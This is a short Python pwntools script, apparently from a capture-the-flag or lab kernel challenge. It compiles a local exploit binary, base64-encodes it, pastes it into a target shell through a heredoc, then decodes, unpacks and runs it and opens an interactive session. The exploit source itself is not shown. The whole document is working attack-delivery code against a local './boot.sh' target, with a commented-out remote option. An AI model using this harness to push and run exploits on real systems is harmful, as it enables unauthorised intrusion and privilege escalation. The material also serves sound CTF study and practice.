from pwn import *
import os

# context.log_level = 'debug'
cmd = '# '

def exploit(io):
    io.sendlineafter(cmd, 'stty -echo')
    os.system('musl-gcc -static -O2 ./poc/exp.c -o ./poc/exp')
    os.system('gzip -c ./poc/exp > ./poc/exp.gz')
    io.sendlineafter(cmd, 'cat <<EOF > exp.gz.b64')
    io.sendline((read('./poc/exp.gz')).encode('base64'))
    io.sendline('EOF')
    io.sendlineafter(cmd, 'base64 -d exp.gz.b64 > exp.gz')
    io.sendlineafter(cmd, 'gunzip ./exp.gz')
    io.sendlineafter(cmd, 'chmod +x ./exp')
    io.sendlineafter(cmd, './exp')
    io.interactive()


p = process('./boot.sh', shell=True)
# p = remote('127.0.0.1',0000 )

exploit(p)

